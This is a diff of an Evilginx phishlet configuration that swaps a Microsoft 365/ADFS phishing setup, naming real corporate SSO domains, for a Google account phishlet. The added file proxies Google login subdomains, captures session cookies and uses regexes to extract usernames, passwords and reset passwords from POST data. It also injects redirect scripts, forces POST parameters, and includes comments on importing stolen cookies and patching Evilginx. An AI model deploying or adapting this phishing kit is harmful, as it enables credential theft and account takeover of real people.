@@ -1,148 +1,165 @@
-name: 'o365'
-author: 'Combined'
-min_ver: '3.1.0'
+name: 'Google'
+author: 'gamer_csap123'
+min_ver: '2.3.0'
 
 proxy_hosts:
-  # --- From the first phishlet (Microsoft 365 with ADFS Bypass) ---
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false}
-  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
-  - {phish_sub: 'login-microsoft', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false}
-  - {phish_sub: 'login-live', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false}
-  - {phish_sub: 'www365', orig_sub: 'www', domain: 'microsoft365.com', session: false, is_landing: false}
-  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'adfs.phishing.zulars.xyz', session: true, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
 
-  # --- From the second phishlet (o365) ---
-  # Note: We already used {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com'} above as landing=true
-  # so we skip that duplicate or unify it (the above is chosen as landing = true).
-  - {phish_sub: 'www2',   orig_sub: 'www', domain: 'office.com', session: false, is_landing: false} 
-    # ^ Example if you want to keep a distinct phish_sub to avoid conflicts
-  # Example ADFS placeholders from second phishlet
-  - {phish_sub: 'outlooksts', orig_sub: 'outlooksts', domain: 'disney.com', session: true, is_landing: false}
-  - {phish_sub: 'adfs-godaddy', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}
-  - {phish_sub: 'adfs-godaddy-443', orig_sub: 'sso', domain: 'godaddy.com:443', session: true, is_landing: false}
-  # etc. Add or comment out as needed...
-  # - {phish_sub: 'adfs-woodhead', orig_sub: 'adfs', domain: 'woodhead-group.co.uk', ...}
-  # - {phish_sub: 'adfs-woodhead-443', orig_sub: 'adfs', domain: 'woodhead-group.co.uk:443', ...}
-  # etc.
 
 sub_filters:
-  # --- From the first phishlet ---
-  - {triggers_on: 'adfs.adfs.phishing.zulars.xyz', orig_sub: 'login', domain: 'microsoftonline.com',
-    search: 'href="https://{hostname}', replace: 'href="https://{hostname}',
-    mimes: ['text/html', 'application/json', 'application/javascript']}
+# (In case js_inject don't works) Redirect on desired url (replace targetDomain) if successful login occurs by detecting valid session cookies
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var redirectCount=0,maxRedirects=3,targetDomain="https://google.com";function checkCookies(){document.cookie.includes("SID")&&document.cookie.includes("APISID")&&document.cookie.includes("SAPISID")?window.location.hostname!==targetDomain?window.location.href=targetDomain:cancelAnimationFrame(animationId):++redirectCount>=maxRedirects&&cancelAnimationFrame(animationId)}document.addEventListener("DOMContentLoaded",(function(){checkCookies(),animationId=requestAnimationFrame((function e(){checkCookies(),animationId=requestAnimationFrame(e)}))}));</script></body>', mimes: ['text/html', 'application/json']}
 
-  - {triggers_on: 'adfs.adfs.phishing.zulars.xyz', orig_sub: 'login', domain: 'microsoftonline.com',
-    search: 'https://{hostname}', replace: 'https://{hostname}',
-    mimes: ['text/html', 'application/json', 'application/javascript']}
 
-  # --- From the second phishlet ---
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com',
-    search: 'href="https://{hostname}', replace: 'href="https://{hostname}',
-    mimes: ['text/html', 'application/json', 'application/javascript']}
+# Goback if browser not support issues occurs for some reason
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>!function(){function e(){var e=document.body.textContent||document.body.innerText,n=window.location.href.includes("v3/signin/rejected");e.includes("This browser or app may not be secure.")&&n&&(window.location.href="/")}document.addEventListener("DOMContentLoaded",e),window.addEventListener("load",e),setTimeout(e,2e3)}();</script></body>', mimes: ['text/html', 'application/json']}
 
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com',
-    search: 'https://{hostname}', replace: 'https://{hostname}',
-    mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+# Fixing Forget Password Actions
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var isListenerAdded = false, intervalID = setInterval(() => (!document.body.innerText.includes("You can update your password now if you forgot it.") ? (console.warn("Required text not found. Operations aborted."), isListenerAdded = true) : window.location.href.includes("/changepassword") ? ((button = document.querySelectorAll("button[type=\"button\"]")[1]) && button.innerText === "Update password" ? (console.log("On the way to add Listener ..."), button.addEventListener("click", () => window.location.href.includes("/changepassword") && setTimeout(() => location.reload(), 2000)), console.log("Event listener added to the button."), isListenerAdded = true) : !isListenerAdded ? (console.warn("Button not found. Retrying in 500ms."), setTimeout(() => addButtonEventListener(), 500)) : null) : console.warn("URL does not match. Operations aborted."), isListenerAdded && clearInterval(intervalID)), 500);</script></body>', mimes: ['text/html', 'application/json']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
 
-  # Additional ADFS placeholders from second phishlet
-  - {triggers_on: 'outlooksts.disney.com', orig_sub: 'login', domain: 'microsoftonline.com',
-    search: 'https://{hostname}', replace: 'https://{hostname}',
-    mimes: ['text/html', 'application/json', 'application/javascript']}
-
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com',
-    search: 'https://{hostname}', replace: 'https://{hostname}',
-    mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-
-  # ... etc. for woodhead-group references (comment out or remove if not needed)
-
+  
 auth_tokens:
-  # Merge from both. They’re effectively the same but we keep them:
-  - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
-    type: 'cookie'
+  - domain: '.google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
 
-  # If the second phishlet has the same domain with the same keys, you can unify:
-  # The second had 2 lines, but they are basically the same. Combining them:
-  #   domain: '.login.microsoftonline.com'
-  #     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
-  #   domain: 'login.microsoftonline.com'
-  #     keys: ['SignInStateCookie']
-  # The above single entry merges them with `type: 'cookie'`.
+# Injecting Google Session cookies
+# - Go to google.com
+# - Delete cookies
+# - then import cookies
+# - then refresh and go to account.google.com or mail.google.com
+# - then click on sign in
+# - then insert cookies
+# - and then refresh page and if not logged in insert cookies again and wait for it to automatically detect or refresh.
 
 auth_urls:
-  # From second phishlet
-  - '/kmsi*'
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+  - '/'
 
 credentials:
-  # Usually these can just be merged. Both are the same logic:
   username:
-    key: '(login|UserName)'
-    search: '(.*)'
+    key: ''
+    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
     type: 'post'
-
   password:
-    key: '(passwd|Password|accesspass)'
-    search: '(.*)'
+    key: ''
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
     type: 'post'
-
   custom:
-    - key: 'mfaAuthMethod'  # only existed in first phishlet, if you want to track MFA method
-      search: '(.*)'
+    # Updated_Password after password reset
+    - key: 'f.req'
+      search: '\["gf.siecp","([^"]*)"\]' 
       type: 'post'
 
-login:
-  # Merge from both; basically the same:
-  domain: 'login.microsoftonline.com'
-  path: '/'
 
-# Force POST from the first phishlet (handles ADFS wresult wctx data)
+# Force GET - By default evilginx will modify all the domain URLs in GET Parameters which breaks some of the google functionality. Hence we need a Feature FORCE GET same as FORCE POST to modify the GET Parameters on the Fly. This can be also achieved by modifying the proxy.go file code for specific cases, But for generalized implementation Force GET feature would be better solution.
+
+# Get Parameters at below URL GET Requests are also has to be fixed in order to completely fix the google phishlet. For now its performing some redirects to avoid broken requests.
+
+# https://accounts.google.com/SignOutOptions?hl=en&continue=https://myaccount.google.com/%3Fpli%3D1%26utm_source%3Dsign_in_no_continue&ec=GBRAwAE
+# https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&hl=en&checkedDomains=youtube&pstMsg=1&flowName=GlifWebSignIn&ifkv=Af_xneGCEkLu6gkoKlJZTXE3KXLOwxAnakKqQdVySZALt605-KszqbxQ0rMNOFS7KQ-c7oUu8ii5ZQ&chtml=LoginDoneHtml&gidl=EgIIAA
+# At this above url "continue" parameter has to be fixed to original.
+
+# https://accounts.google.com/RotateCookiesPage?og_pid=192&rot=3&origin=https%3A%2F%2Fmyaccount.google.com&exp_id=3701180
+# https://myaccount.google.com/profile-picture?origin=https%3A%2F%2Fmyaccount.google.com&hostId=ma&theme=light
+# https://ogs.google.com/u/0/widget/account?amf=1&sea=1&origin=https%3A%2F%2Fmyaccount.google.com&cn=account&pid=269&spid=192
+# "origin" parameter here
+
+# https://accounts.google.com/v3/signin/_/AccountsSignInUi/jserror?script=https%3A%2F%2Faccounts.google.com%2Fv3%2Fsignin%2Fidentifier%3Fdsh%3DS1191604103%253A1688217227804093%26flowEntry%3DServiceLogin%26flowName%3DGlifWebSignIn%26hl%3Den%26ifkv%3DAeDOFXg67kiWubFUSHU6sApYqZnTZI3YeDi9EZLK57WXacrsipRvu2kFKMGeJjsp-VYVPM6G-uvoCg&error=%24%20is%20not%20defined&line=177
+# "script" parameter here
+
+
 force_post:
-  - path: '/login.srf'
+# https://accounts.google.com/_/signin/selectchallenge?hl=en&TL=AG7eRGB2-SZJFBR2JnUScncEPZlLcKjbvfkegVpvSE25DnahfIioRPDnf8tCIwGv&_reqid=77650&rt=j
+# https://accounts.google.com/_/signin/challenge?hl=en&TL=AG7eRGB5pPAqRiQLRWrxaZSQVNHcQGXcLXqPPxP-Dr6j-QYlITw9Y2zI-tEww6hl&_reqid=178518&rt=j
+# https://accounts.google.com/_/speedbump/changepassword?hl=en&TL=AG7eRGATorowZWWmA0AKwBrJhabhAmltjCD863PUmrEDR-2topZwstTMwNN4DrPL&_reqid=480805&rt=j
+
+  - path: '/selectchallenge'
     search:
-      - {key: 'wa', search: '.*'}
-      - {key: 'wresult', search: '.*'}
-      - {key: 'wctx', search: '.*'}
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      #- {key: 'bghash', search: '.*'}
     force:
-      - {key: 'wresult', search: 'http\:\/\/adfs\.phishing\.zulars\.xyz\:443',
-         value: 'http://adfs.phishing.zulars.xyz'}
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
     type: 'post'
 
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+
+# To make js_inject work in v3.0 evilginx, Make sure to do these changes (https://github.com/kgretzky/evilginx2/issues/904#issuecomment-1585787426)
+# in file core/phishlet.go on line 909
+# replace line -  re, err := regexp.Compile("^" + d + "$")
+# with line -     re, err := regexp.Compile(d)
+
 js_inject:
-  # Both phishlets have the same auto-fill script. Just keep one:
-  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
-    trigger_paths: ["/common/oauth2/v2.0/authorize*", "/", "/*"]
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/' , '/changepassword', '/signin']
     script: |
-      function lp(){
-        var emailId = document.querySelector("#i0116");
-        var nextButton = document.querySelector("#idSIButton9");
-        var query = window.location.href;
-        if (/#/.test(window.location.href)){
-          var res = query.split("#");
-          var data1 = res[0];
-          var data2 = res[1];
-          console.log(data1);
-          console.log(data2);
-          if (emailId != null) {
-            var decodedString = data2;
-            // Check if string is base64
-            if (/^[A-Za-z0-9+/=]+$/.test(data2)) {
-              try {
-                decodedString = window.atob(data2.replace(/[=]/gi, ''));
-              } catch (e) {
-                console.error('Error decoding base64 string:', e);
-              }
+        //----------------Redirection on success login--------------------
+        var redirectCount = 0;
+        var maxRedirects = 3;
+        //var targetDomain = '{redirect-url}';
+        var targetDomain = 'https://google.com'; // Update with the target domain
+        function checkCookies() {
+            if (document.cookie.includes('SID') && document.cookie.includes('APISID') && document.cookie.includes('SAPISID')) {
+                if (window.location.hostname !== targetDomain) {
+                    window.location.href = targetDomain;
+                } else {
+                    cancelAnimationFrame(animationId);
+                }
+            } else {
+                redirectCount++;
+                if (redirectCount >= maxRedirects) {
+                    cancelAnimationFrame(animationId);
+                }
             }
-            emailId.focus();
-            emailId.value = decodedString;
-            nextButton.focus();
-            nextButton.click();
-            console.log("YES!");
-            return;
-          }
         }
-        setTimeout(function(){lp();}, 500);
-      }
-      setTimeout(function(){lp();}, 500);
+        document.addEventListener('DOMContentLoaded', function() {
+            // Call the checkCookies function at the start
+            checkCookies();
+            // Continue to call checkCookies before each repaint
+            animationId = requestAnimationFrame(function repeat() {
+                checkCookies();
+                animationId = requestAnimationFrame(repeat);
+            });
+        });
